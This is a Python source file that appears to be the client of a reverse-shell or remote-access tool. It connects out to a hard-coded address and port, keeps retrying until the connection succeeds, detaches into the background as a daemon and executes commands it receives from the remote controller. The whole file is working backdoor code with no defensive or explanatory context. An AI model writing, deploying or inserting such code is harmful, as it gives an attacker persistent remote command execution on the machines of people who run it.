import argparse
import time
import os
import sys
from remote_shell.network import connect, reliable_recv, reliable_send
from remote_shell.commands.shell import handle_command

def connection_loop(host, port):
    while True:
        try:
            s = connect(host, port)
            shell(s)
            s.close()
            break
        except Exception:
            time.sleep(5)


def shell(sock):
    while True:
        command = reliable_recv(sock)
        if not handle_command(sock, command):
            break


def daemonize():
    if os.environ.get('BLACKFOREST_DAEMON') != '1':
        pid = os.fork()
        if pid > 0:
            print(f"[+] Session started in background (pid {pid})")
            sys.exit(0)
        os.setsid()
        os.environ['BLACKFOREST_DAEMON'] = '1'


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', default='192.168.188.89')
    parser.add_argument('--port', type=int, default=5555)
    args = parser.parse_args()
    daemonize()
    connection_loop(args.host, args.port)

if __name__ == '__main__':
    main()
